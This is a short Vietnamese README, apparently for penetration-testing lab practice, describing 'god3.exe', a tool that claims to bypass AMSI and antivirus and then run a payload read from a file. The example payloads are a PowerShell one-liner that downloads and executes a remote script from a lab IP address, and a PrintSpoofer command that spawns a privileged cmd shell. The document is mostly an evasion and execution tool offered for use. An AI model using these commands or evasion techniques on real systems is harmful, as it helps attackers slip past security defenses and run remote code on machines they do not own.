# god-bo-tung

Bố Tùng viết cái này để bypass amsi, trigger powershell và bypass AV lên đến 99% cho các con cháu múa trong labs

Nói chung ngu thì upload xong chạy thử, không được thì RDP xong chạy


god3.exe <dường dẫn file payload>
Ex:
    god3.exe C:\User\Public\Desktop\payload.txt
    payload.txt: powershell -Sta -Nop -Command "iex (New-Object Net.WebClient).DownloadString('http://192.168.49.121/gg.sp1')"
    hoặc
    payload.txt: C:\User\Public\Desktop\PrintSpoofer64.exe -c "cmd.exe"
Có 2 trường hợp của tool:
- TH1(Dành cho trường hợp ko truyền đc param vào cmd hoặc ko muốn truyền) Nếu không nhập đường dẫn file payload.txt. Tool sẽ tự tìm file tên "godpay" trong cùng thư mục của file god3.exe rồi đọc paylaod trong file đấy
- TH1(Chỉ muốn bật powershell)Nếu không tồn tại file "godpay" thì tool chỉ bật powershell 
